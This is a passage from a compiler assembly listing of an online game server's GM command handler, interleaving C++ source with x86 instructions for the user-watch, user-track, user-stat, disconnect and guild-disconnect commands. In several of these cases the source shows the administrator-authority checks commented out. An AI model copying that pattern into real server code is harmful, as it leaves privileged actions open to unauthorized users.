  01291	e8 00 00 00 00	 call	 ?PHeadSubSetB@@YAXPAEEEH@Z ; PHeadSubSetB
  01296	83 c4 10	 add	 esp, 16			; 00000010H

; 2115 : 
; 2116 : 			ServerCmd.CmdType = 0;

  01299	c6 85 7c fc ff
	ff 00		 mov	 BYTE PTR _ServerCmd$111[ebp+4], 0

; 2117 : 
; 2118 : 			for( int i = 0; i < 15; i++ )

  012a0	c7 85 74 fc ff
	ff 00 00 00 00	 mov	 DWORD PTR _i$110[ebp], 0
  012aa	eb 0f		 jmp	 SHORT $LN36@Management
$LN34@Management:
  012ac	8b 85 74 fc ff
	ff		 mov	 eax, DWORD PTR _i$110[ebp]
  012b2	83 c0 01	 add	 eax, 1
  012b5	89 85 74 fc ff
	ff		 mov	 DWORD PTR _i$110[ebp], eax
$LN36@Management:
  012bb	83 bd 74 fc ff
	ff 0f		 cmp	 DWORD PTR _i$110[ebp], 15 ; 0000000fH
  012c2	7d 68		 jge	 SHORT $LN35@Management

; 2119 : 			{
; 2120 : 				ServerCmd.X = x+((rand()%5)*2)-4;

  012c4	e8 00 00 00 00	 call	 _rand
  012c9	99		 cdq
  012ca	b9 05 00 00 00	 mov	 ecx, 5
  012cf	f7 f9		 idiv	 ecx
  012d1	8b 85 84 fc ff
	ff		 mov	 eax, DWORD PTR _x$113[ebp]
  012d7	8d 4c 50 fc	 lea	 ecx, DWORD PTR [eax+edx*2-4]
  012db	88 8d 7d fc ff
	ff		 mov	 BYTE PTR _ServerCmd$111[ebp+5], cl

; 2121 : 				ServerCmd.Y = y+((rand()%5)*2)-4;

  012e1	e8 00 00 00 00	 call	 _rand
  012e6	99		 cdq
  012e7	b9 05 00 00 00	 mov	 ecx, 5
  012ec	f7 f9		 idiv	 ecx
  012ee	8b 85 80 fc ff
	ff		 mov	 eax, DWORD PTR _y$112[ebp]
  012f4	8d 4c 50 fc	 lea	 ecx, DWORD PTR [eax+edx*2-4]
  012f8	88 8d 7e fc ff
	ff		 mov	 BYTE PTR _ServerCmd$111[ebp+6], cl

; 2122 : 				MsgSendV2(lpObj, (LPBYTE)&ServerCmd, sizeof(ServerCmd));

  012fe	6a 07		 push	 7
  01300	8d 85 78 fc ff
	ff		 lea	 eax, DWORD PTR _ServerCmd$111[ebp]
  01306	50		 push	 eax
  01307	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0130a	51		 push	 ecx
  0130b	e8 00 00 00 00	 call	 ?MsgSendV2@@YAXPAVOBJECTSTRUCT@@PAEH@Z ; MsgSendV2
  01310	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2123 : 				::DataSend(lpObj->m_Index, (LPBYTE)&ServerCmd, sizeof(ServerCmd));

  01313	6a 07		 push	 7
  01315	8d 85 78 fc ff
	ff		 lea	 eax, DWORD PTR _ServerCmd$111[ebp]
  0131b	50		 push	 eax
  0131c	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0131f	8b 11		 mov	 edx, DWORD PTR [ecx]
  01321	52		 push	 edx
  01322	e8 00 00 00 00	 call	 ?DataSend@@YAHHPAEK@Z	; DataSend
  01327	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2124 : 			}

  0132a	eb 80		 jmp	 SHORT $LN34@Management
$LN35@Management:

; 2125 : 		}
; 2126 : 		break;

  0132c	e9 8b 29 00 00	 jmp	 $LN2@Management
$LN118@Management:

; 2127 : 
; 2128 : 	//------------------------------------------------------------------------
; 2129 : 	//  
; 2130 : 	case GMCMD_USERWATCHNG :
; 2131 : 
; 2132 : #ifndef GMCOMMAND_EX_1ST_BUGFIX
; 2133 : 
; 2134 : #ifndef FOR_ONAIR
; 2135 : 		if( (lpObj->Authority&AUTHORITY_ADMIN) != AUTHORITY_ADMIN 
; 2136 : 
; 2137 : #ifdef ADD_AUTHORITY_CODE_OF_EVENT_GM_20050602
; 2138 : 			&& (lpObj->Authority&AUTHORITY_EVENT_GM) != AUTHORITY_EVENT_GM

  01331	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01334	8b 88 a4 01 00
	00		 mov	 ecx, DWORD PTR [eax+420]
  0133a	83 e1 02	 and	 ecx, 2
  0133d	75 15		 jne	 SHORT $LN119@Management
  0133f	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01342	8b 88 a4 01 00
	00		 mov	 ecx, DWORD PTR [eax+420]
  01348	83 e1 20	 and	 ecx, 32			; 00000020H
  0134b	75 07		 jne	 SHORT $LN119@Management

; 2139 : #endif
; 2140 :        	  ) 
; 2141 : 			return 0;

  0134d	33 c0		 xor	 eax, eax
  0134f	e9 6a 29 00 00	 jmp	 $LN1@Management
$LN119@Management:

; 2142 : #endif
; 2143 : 
; 2144 : #endif // GMCOMMAND_EX_1ST_BUGFIX
; 2145 : 
; 2146 : 		{
; 2147 : 			pId = GetTokenString();			

  01354	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  01357	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  0135c	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 2148 : 			if( pId == NULL ) return 0;

  01362	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  01369	75 07		 jne	 SHORT $LN120@Management
  0136b	33 c0		 xor	 eax, eax
  0136d	e9 4c 29 00 00	 jmp	 $LN1@Management
$LN120@Management:

; 2149 : 
; 2150 : 			LPOBJECTSTRUCT	lpTargetObj = gObjFind(pId);

  01372	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  01378	50		 push	 eax
  01379	e8 00 00 00 00	 call	 ?gObjFind@@YAPAVOBJECTSTRUCT@@PAD@Z ; gObjFind
  0137e	83 c4 04	 add	 esp, 4
  01381	89 85 70 fc ff
	ff		 mov	 DWORD PTR _lpTargetObj$109[ebp], eax

; 2151 : 
; 2152 : 			if( lpTargetObj == NULL )

  01387	83 bd 70 fc ff
	ff 00		 cmp	 DWORD PTR _lpTargetObj$109[ebp], 0
  0138e	75 07		 jne	 SHORT $LN121@Management

; 2153 : 				return 0;

  01390	33 c0		 xor	 eax, eax
  01392	e9 27 29 00 00	 jmp	 $LN1@Management
$LN121@Management:

; 2154 : 			
; 2155 : 	//## ADD_LOG_GM_COMMAND_20050426
; 2156 : 	#ifdef ADD_LOG_GM_COMMAND_20040420
; 2157 : 			LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] / Target : [%s][%s] : %s ", 

  01397	68 00 00 00 00	 push	 OFFSET ??_C@_0O@MIJMFKGB@User?5Watching@
  0139c	8b 85 70 fc ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$109[ebp]
  013a2	83 c0 73	 add	 eax, 115		; 00000073H
  013a5	50		 push	 eax
  013a6	8b 8d 70 fc ff
	ff		 mov	 ecx, DWORD PTR _lpTargetObj$109[ebp]
  013ac	83 c1 68	 add	 ecx, 104		; 00000068H
  013af	51		 push	 ecx
  013b0	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  013b3	83 c2 73	 add	 edx, 115		; 00000073H
  013b6	52		 push	 edx
  013b7	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  013ba	83 c0 68	 add	 eax, 104		; 00000068H
  013bd	50		 push	 eax
  013be	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  013c1	83 c1 18	 add	 ecx, 24			; 00000018H
  013c4	51		 push	 ecx
  013c5	68 00 00 00 00	 push	 OFFSET ??_C@_0EB@OBAKBBAF@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  013ca	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  013d0	83 c4 1c	 add	 esp, 28			; 0000001cH

; 2158 : 				lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, 
; 2159 : 				lpTargetObj->AccountID, lpTargetObj->Name, "User Watching");
; 2160 : 	#endif
; 2161 : 
; 2162 : 			char sMsg[255];
; 2163 : 			if( WatchTargetIndex == lpTargetObj->m_Index )

  013d3	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  013d6	8b 8d 70 fc ff
	ff		 mov	 ecx, DWORD PTR _lpTargetObj$109[ebp]
  013dc	8b 90 8c 31 00
	00		 mov	 edx, DWORD PTR [eax+12684]
  013e2	3b 11		 cmp	 edx, DWORD PTR [ecx]
  013e4	75 45		 jne	 SHORT $LN122@Management

; 2164 : 			{
; 2165 : 				WatchTargetIndex = -1;

  013e6	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  013e9	c7 80 8c 31 00
	00 ff ff ff ff	 mov	 DWORD PTR [eax+12684], -1

; 2166 : 				
; 2167 : 				wsprintf(sMsg, "%s : ", lpTargetObj->Name);

  013f3	8b 85 70 fc ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$109[ebp]
  013f9	83 c0 73	 add	 eax, 115		; 00000073H
  013fc	50		 push	 eax
  013fd	68 00 00 00 00	 push	 OFFSET ??_C@_0O@MKODHHAM@?$CFs?5?3?5?$LA?$KI?$LN?C?G?X?A?$KG@
  01402	8d 8d 70 fb ff
	ff		 lea	 ecx, DWORD PTR _sMsg$108[ebp]
  01408	51		 push	 ecx
  01409	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__wsprintfA
  0140f	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2168 : 				GCServerMsgStringSend(sMsg, lpObj->m_Index, 1);

  01412	6a 01		 push	 1
  01414	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01417	8b 08		 mov	 ecx, DWORD PTR [eax]
  01419	51		 push	 ecx
  0141a	8d 95 70 fb ff
	ff		 lea	 edx, DWORD PTR _sMsg$108[ebp]
  01420	52		 push	 edx
  01421	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  01426	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2169 : 			}

  01429	eb 47		 jmp	 SHORT $LN123@Management
$LN122@Management:

; 2170 : 			else
; 2171 : 			{
; 2172 : 				wsprintf(sMsg, "%s : ", lpTargetObj->Name);

  0142b	8b 85 70 fc ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$109[ebp]
  01431	83 c0 73	 add	 eax, 115		; 00000073H
  01434	50		 push	 eax
  01435	68 00 00 00 00	 push	 OFFSET ??_C@_0O@GFMKDCHA@?$CFs?5?3?5?$LA?$KI?$LN?C?$LN?C?$MA?$NL@
  0143a	8d 8d 70 fb ff
	ff		 lea	 ecx, DWORD PTR _sMsg$108[ebp]
  01440	51		 push	 ecx
  01441	ff 15 00 00 00
	00		 call	 DWORD PTR __imp__wsprintfA
  01447	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2173 : 				GCServerMsgStringSend(sMsg, lpObj->m_Index, 1);

  0144a	6a 01		 push	 1
  0144c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0144f	8b 08		 mov	 ecx, DWORD PTR [eax]
  01451	51		 push	 ecx
  01452	8d 95 70 fb ff
	ff		 lea	 edx, DWORD PTR _sMsg$108[ebp]
  01458	52		 push	 edx
  01459	e8 00 00 00 00	 call	 ?GCServerMsgStringSend@@YAXPADHE@Z ; GCServerMsgStringSend
  0145e	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2174 : 				WatchTargetIndex = lpTargetObj->m_Index;

  01461	8b 45 ec	 mov	 eax, DWORD PTR _this$[ebp]
  01464	8b 8d 70 fc ff
	ff		 mov	 ecx, DWORD PTR _lpTargetObj$109[ebp]
  0146a	8b 11		 mov	 edx, DWORD PTR [ecx]
  0146c	89 90 8c 31 00
	00		 mov	 DWORD PTR [eax+12684], edx
$LN123@Management:

; 2175 : 			}
; 2176 : 		}
; 2177 : 		break;			

  01472	e9 45 28 00 00	 jmp	 $LN2@Management
$LN124@Management:

; 2178 : 
; 2179 : 	//------------------------------------------------------------------------
; 2180 : 	//  		
; 2181 : 	case GMCMD_USERTRAKING :
; 2182 : 		{
; 2183 : 			pId = GetTokenString();

  01477	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0147a	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  0147f	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 2184 : 			int map, x, y;
; 2185 : 			if( pId == NULL ) return 0;

  01485	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  0148c	75 07		 jne	 SHORT $LN125@Management
  0148e	33 c0		 xor	 eax, eax
  01490	e9 29 28 00 00	 jmp	 $LN1@Management
$LN125@Management:

; 2186 : 
; 2187 : 			LPOBJECTSTRUCT	lpTargetObj = gObjFind(pId);

  01495	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  0149b	50		 push	 eax
  0149c	e8 00 00 00 00	 call	 ?gObjFind@@YAPAVOBJECTSTRUCT@@PAD@Z ; gObjFind
  014a1	83 c4 04	 add	 esp, 4
  014a4	89 85 60 fb ff
	ff		 mov	 DWORD PTR _lpTargetObj$104[ebp], eax

; 2188 : 
; 2189 : 			if( lpTargetObj == NULL )

  014aa	83 bd 60 fb ff
	ff 00		 cmp	 DWORD PTR _lpTargetObj$104[ebp], 0
  014b1	75 07		 jne	 SHORT $LN126@Management

; 2190 : 				return 0;

  014b3	33 c0		 xor	 eax, eax
  014b5	e9 04 28 00 00	 jmp	 $LN1@Management
$LN126@Management:

; 2191 : 
; 2192 : 	//## ADD_LOG_GM_COMMAND_20050426
; 2193 : 	#ifdef ADD_LOG_GM_COMMAND_20040420
; 2194 : 			LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] / Target : [%s][%s] : %s", 

  014ba	68 00 00 00 00	 push	 OFFSET ??_C@_0O@HBGDJJNF@User?5Tracking@
  014bf	8b 85 60 fb ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$104[ebp]
  014c5	83 c0 73	 add	 eax, 115		; 00000073H
  014c8	50		 push	 eax
  014c9	8b 8d 60 fb ff
	ff		 mov	 ecx, DWORD PTR _lpTargetObj$104[ebp]
  014cf	83 c1 68	 add	 ecx, 104		; 00000068H
  014d2	51		 push	 ecx
  014d3	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  014d6	83 c2 73	 add	 edx, 115		; 00000073H
  014d9	52		 push	 edx
  014da	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  014dd	83 c0 68	 add	 eax, 104		; 00000068H
  014e0	50		 push	 eax
  014e1	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  014e4	83 c1 18	 add	 ecx, 24			; 00000018H
  014e7	51		 push	 ecx
  014e8	68 00 00 00 00	 push	 OFFSET ??_C@_0EA@DPOHDNID@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  014ed	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  014f3	83 c4 1c	 add	 esp, 28			; 0000001cH

; 2195 : 				lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, 
; 2196 : 				lpTargetObj->AccountID, lpTargetObj->Name, "User Tracking");
; 2197 : 	#endif
; 2198 : 			
; 2199 : 			map = lpTargetObj->MapNumber;

  014f6	8b 85 60 fb ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$104[ebp]
  014fc	0f b6 88 09 01
	00 00		 movzx	 ecx, BYTE PTR [eax+265]
  01503	89 8d 6c fb ff
	ff		 mov	 DWORD PTR _map$107[ebp], ecx

; 2200 : 			x   = lpTargetObj->X;

  01509	8b 85 60 fb ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$104[ebp]
  0150f	0f bf 88 04 01
	00 00		 movsx	 ecx, WORD PTR [eax+260]
  01516	89 8d 68 fb ff
	ff		 mov	 DWORD PTR _x$106[ebp], ecx

; 2201 : 			y   = lpTargetObj->Y;

  0151c	8b 85 60 fb ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$104[ebp]
  01522	0f bf 88 06 01
	00 00		 movsx	 ecx, WORD PTR [eax+262]
  01529	89 8d 64 fb ff
	ff		 mov	 DWORD PTR _y$105[ebp], ecx

; 2202 : 			int aIndex = lpObj->m_Index;

  0152f	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01532	8b 08		 mov	 ecx, DWORD PTR [eax]
  01534	89 8d 5c fb ff
	ff		 mov	 DWORD PTR _aIndex$103[ebp], ecx

; 2203 : 			if( aIndex >= 0 )

  0153a	83 bd 5c fb ff
	ff 00		 cmp	 DWORD PTR _aIndex$103[ebp], 0
  01541	7c 24		 jl	 SHORT $LN127@Management

; 2204 : 			{
; 2205 : 				gObjTeleport(aIndex, map, x, y);

  01543	8b 85 64 fb ff
	ff		 mov	 eax, DWORD PTR _y$105[ebp]
  01549	50		 push	 eax
  0154a	8b 8d 68 fb ff
	ff		 mov	 ecx, DWORD PTR _x$106[ebp]
  01550	51		 push	 ecx
  01551	8b 95 6c fb ff
	ff		 mov	 edx, DWORD PTR _map$107[ebp]
  01557	52		 push	 edx
  01558	8b 85 5c fb ff
	ff		 mov	 eax, DWORD PTR _aIndex$103[ebp]
  0155e	50		 push	 eax
  0155f	e8 00 00 00 00	 call	 ?gObjTeleport@@YAXHHHH@Z ; gObjTeleport
  01564	83 c4 10	 add	 esp, 16			; 00000010H
$LN127@Management:

; 2206 : 			}
; 2207 : 		}
; 2208 : 		break;		

  01567	e9 50 27 00 00	 jmp	 $LN2@Management
$LN128@Management:

; 2209 : 
; 2210 : 	//------------------------------------------------------------------------
; 2211 : 	//    
; 2212 : 	case GMCMD_USERSTAT :	
; 2213 : /*
; 2214 : #ifdef UPDATE_GM_FUNCTION_20070228	//  EVENT_GM   '/' 
; 2215 : 		if( ( (lpObj->Authority&AUTHORITY_ADMIN) != AUTHORITY_ADMIN) 
; 2216 : 			&& ( (lpObj->Authority&AUTHORITY_EVENT_GM) != AUTHORITY_EVENT_GM) ) 
; 2217 : 		{
; 2218 : 			return 0;
; 2219 : 		}
; 2220 : #else
; 2221 : 		if( (lpObj->Authority&AUTHORITY_ADMIN) != AUTHORITY_ADMIN ) return 0;
; 2222 : #endif
; 2223 : */
; 2224 : 		{
; 2225 : 	#ifdef ADD_LOG_GM_COMMAND_20040420
; 2226 : 			LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  0156c	68 00 00 00 00	 push	 OFFSET ??_C@_0BH@NPPBDIDN@User?5Stat?5?$CIconnection?$CJ@
  01571	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01574	83 c0 73	 add	 eax, 115		; 00000073H
  01577	50		 push	 eax
  01578	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0157b	83 c1 68	 add	 ecx, 104		; 00000068H
  0157e	51		 push	 ecx
  0157f	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  01582	83 c2 18	 add	 edx, 24			; 00000018H
  01585	52		 push	 edx
  01586	68 00 00 00 00	 push	 OFFSET ??_C@_0CM@FGOOHLMI@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  0158b	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  01591	83 c4 14	 add	 esp, 20			; 00000014H

; 2227 : 				lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, "User Stat (connection)");
; 2228 : 	#endif
; 2229 : 			int StartLevel = 0;

  01594	c7 85 58 fb ff
	ff 00 00 00 00	 mov	 DWORD PTR _StartLevel$102[ebp], 0

; 2230 : 			int EndLevel = g_GlobalConfig.m_iMaxLevel;

  0159e	a1 c8 00 00 00	 mov	 eax, DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+200
  015a3	89 85 54 fb ff
	ff		 mov	 DWORD PTR _EndLevel$101[ebp], eax

; 2231 : 
; 2232 : 			int start= GetTokenNumber();

  015a9	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  015ac	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  015b1	89 85 50 fb ff
	ff		 mov	 DWORD PTR _start$100[ebp], eax

; 2233 : 			if( start > 0 ) StartLevel = start;

  015b7	83 bd 50 fb ff
	ff 00		 cmp	 DWORD PTR _start$100[ebp], 0
  015be	7e 0c		 jle	 SHORT $LN129@Management
  015c0	8b 85 50 fb ff
	ff		 mov	 eax, DWORD PTR _start$100[ebp]
  015c6	89 85 58 fb ff
	ff		 mov	 DWORD PTR _StartLevel$102[ebp], eax
$LN129@Management:

; 2234 : 
; 2235 : 			int end= GetTokenNumber();

  015cc	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  015cf	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  015d4	89 85 4c fb ff
	ff		 mov	 DWORD PTR _end$99[ebp], eax

; 2236 : 			if( end > 0 ) EndLevel = end;

  015da	83 bd 4c fb ff
	ff 00		 cmp	 DWORD PTR _end$99[ebp], 0
  015e1	7e 0c		 jle	 SHORT $LN130@Management
  015e3	8b 85 4c fb ff
	ff		 mov	 eax, DWORD PTR _end$99[ebp]
  015e9	89 85 54 fb ff
	ff		 mov	 DWORD PTR _EndLevel$101[ebp], eax
$LN130@Management:

; 2237 : 
; 2238 : 			gObjSendUserStatistic(lpObj->m_Index, StartLevel, EndLevel);

  015ef	8b 85 54 fb ff
	ff		 mov	 eax, DWORD PTR _EndLevel$101[ebp]
  015f5	50		 push	 eax
  015f6	8b 8d 58 fb ff
	ff		 mov	 ecx, DWORD PTR _StartLevel$102[ebp]
  015fc	51		 push	 ecx
  015fd	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  01600	8b 02		 mov	 eax, DWORD PTR [edx]
  01602	50		 push	 eax
  01603	e8 00 00 00 00	 call	 ?gObjSendUserStatistic@@YAXHHH@Z ; gObjSendUserStatistic
  01608	83 c4 0c	 add	 esp, 12			; 0000000cH

; 2239 : 		}
; 2240 : 		break;

  0160b	e9 ac 26 00 00	 jmp	 $LN2@Management
$LN131@Management:

; 2241 : 	//------------------------------------------------------------------------
; 2242 : 	//   
; 2243 : 	case GMCMD_DISCONNECT :	
; 2244 : 		//if( (lpObj->Authority&AUTHORITY_USER) != AUTHORITY_USER ) 
; 2245 : //		if( (lpObj->AuthorityCode&AUTHORITY_CODE_DISCONNECT) != AUTHORITY_CODE_DISCONNECT) return 0;
; 2246 : 
; 2247 : 		pId = GetTokenString();

  01610	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  01613	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  01618	89 85 cc fe ff
	ff		 mov	 DWORD PTR _pId$[ebp], eax

; 2248 : 		if( pId == NULL ) return 0;

  0161e	83 bd cc fe ff
	ff 00		 cmp	 DWORD PTR _pId$[ebp], 0
  01625	75 07		 jne	 SHORT $LN132@Management
  01627	33 c0		 xor	 eax, eax
  01629	e9 90 26 00 00	 jmp	 $LN1@Management
$LN132@Management:

; 2249 : 		{
; 2250 : 			int aIndex = gObjGetIndex(pId);

  0162e	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  01634	50		 push	 eax
  01635	e8 00 00 00 00	 call	 ?gObjGetIndex@@YAHPAD@Z	; gObjGetIndex
  0163a	83 c4 04	 add	 esp, 4
  0163d	89 85 48 fb ff
	ff		 mov	 DWORD PTR _aIndex$98[ebp], eax

; 2251 : 			if( aIndex >= 0 )

  01643	83 bd 48 fb ff
	ff 00		 cmp	 DWORD PTR _aIndex$98[ebp], 0
  0164a	0f 8c af 00 00
	00		 jl	 $LN133@Management

; 2252 : 			{
; 2253 : 	//## ADD_LOG_GM_COMMAND_20050426
; 2254 : 	#ifdef ADD_LOG_GM_COMMAND_20040420
; 2255 : 				LPOBJECTSTRUCT	lpTargetObj = gObjFind(pId);

  01650	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  01656	50		 push	 eax
  01657	e8 00 00 00 00	 call	 ?gObjFind@@YAPAVOBJECTSTRUCT@@PAD@Z ; gObjFind
  0165c	83 c4 04	 add	 esp, 4
  0165f	89 85 44 fb ff
	ff		 mov	 DWORD PTR _lpTargetObj$97[ebp], eax

; 2256 : 				
; 2257 : 				if( lpTargetObj == NULL ) return 0;

  01665	83 bd 44 fb ff
	ff 00		 cmp	 DWORD PTR _lpTargetObj$97[ebp], 0
  0166c	75 07		 jne	 SHORT $LN134@Management
  0166e	33 c0		 xor	 eax, eax
  01670	e9 49 26 00 00	 jmp	 $LN1@Management
$LN134@Management:

; 2258 : 
; 2259 : 				LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] / Target : [%s][%s] : %s", 

  01675	68 00 00 00 00	 push	 OFFSET ??_C@_0BA@MEJDKKFB@User?5Disconnect@
  0167a	8b 85 44 fb ff
	ff		 mov	 eax, DWORD PTR _lpTargetObj$97[ebp]
  01680	83 c0 73	 add	 eax, 115		; 00000073H
  01683	50		 push	 eax
  01684	8b 8d 44 fb ff
	ff		 mov	 ecx, DWORD PTR _lpTargetObj$97[ebp]
  0168a	83 c1 68	 add	 ecx, 104		; 00000068H
  0168d	51		 push	 ecx
  0168e	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  01691	83 c2 73	 add	 edx, 115		; 00000073H
  01694	52		 push	 edx
  01695	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  01698	83 c0 68	 add	 eax, 104		; 00000068H
  0169b	50		 push	 eax
  0169c	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  0169f	83 c1 18	 add	 ecx, 24			; 00000018H
  016a2	51		 push	 ecx
  016a3	68 00 00 00 00	 push	 OFFSET ??_C@_0EA@DPOHDNID@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  016a8	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAddTD@@3P6AXPADZZA ; LogAddTD
  016ae	83 c4 1c	 add	 esp, 28			; 0000001cH

; 2260 : 				lpObj->Ip_addr, lpObj->AccountID, lpObj->Name, 
; 2261 : 				lpTargetObj->AccountID, lpTargetObj->Name, "User Disconnect");
; 2262 : 	#endif
; 2263 : 
; 2264 : 				LogAdd(lMsg.Get(447),pId);

  016b1	8b 85 cc fe ff
	ff		 mov	 eax, DWORD PTR _pId$[ebp]
  016b7	50		 push	 eax
  016b8	68 bf 01 00 00	 push	 447			; 000001bfH
  016bd	b9 00 00 00 00	 mov	 ecx, OFFSET ?lMsg@@3VCMsg@@A ; lMsg
  016c2	ff 15 00 00 00
	00		 call	 DWORD PTR __imp_?Get@CMsg@@QAEPADH@Z
  016c8	50		 push	 eax
  016c9	ff 15 00 00 00
	00		 call	 DWORD PTR ?LogAdd@@3P6AXPADZZA ; LogAdd
  016cf	83 c4 08	 add	 esp, 8

; 2265 : 				CloseClient(aIndex);

  016d2	8b 85 48 fb ff
	ff		 mov	 eax, DWORD PTR _aIndex$98[ebp]
  016d8	50		 push	 eax
  016d9	e8 00 00 00 00	 call	 ?CloseClient@@YAXH@Z	; CloseClient
  016de	83 c4 04	 add	 esp, 4

; 2266 : 				GJPUserClose2(lpObj->AccountID);

  016e1	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  016e4	83 c0 68	 add	 eax, 104		; 00000068H
  016e7	50		 push	 eax
  016e8	e8 00 00 00 00	 call	 ?GJPUserClose2@@YAXPAD@Z ; GJPUserClose2
  016ed	83 c4 04	 add	 esp, 4

; 2267 : 		        gObjDel(aIndex);

  016f0	8b 85 48 fb ff
	ff		 mov	 eax, DWORD PTR _aIndex$98[ebp]
  016f6	50		 push	 eax
  016f7	e8 00 00 00 00	 call	 ?gObjDel@@YAFH@Z	; gObjDel
  016fc	83 c4 04	 add	 esp, 4
$LN133@Management:

; 2268 : 			}
; 2269 : 		}
; 2270 : 		break;

  016ff	e9 b8 25 00 00	 jmp	 $LN2@Management
$LN135@Management:

; 2271 : 	case GMCMD_GUILDDISCONNECT :
; 2272 : //		if( (lpObj->AuthorityCode&AUTHORITY_CODE_DISCONNECT) != AUTHORITY_CODE_DISCONNECT) return 0;
; 2273 : 
; 2274 : 	#ifdef ADD_LOG_GM_COMMAND_20040420
; 2275 : 		LogAddTD( "Use GM Command -> [ %s ]\t[ %s ]\t[ %s ] : %s", 

  01704	68 00 00 00 00	 push	 OFFSET ??_C@_0BB@BCPFBGGF@Guild?5Disconnect@
  01709	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0170c	83 c0 73	 add	 eax, 115		; 00000073H
  0170f	50		 push	 eax
  01710	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  01713	83 c1 68	 add	 ecx, 104		; 00000068H
  01716	51		 push	 ecx
  01717	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  0171a	83 c2 18	 add	 edx, 24			; 00000018H
  0171d	52		 push	 edx
  0171e	68 00 00 00 00	 push	 OFFSET ??_C@_0CM@FGOOHLMI@Use?5GM?5Command?5?9?$DO?5?$FL?5?$CFs?5?$FN?7?$FL?5?$CFs?5?$FN@
  01723	ff 15 00 00 00
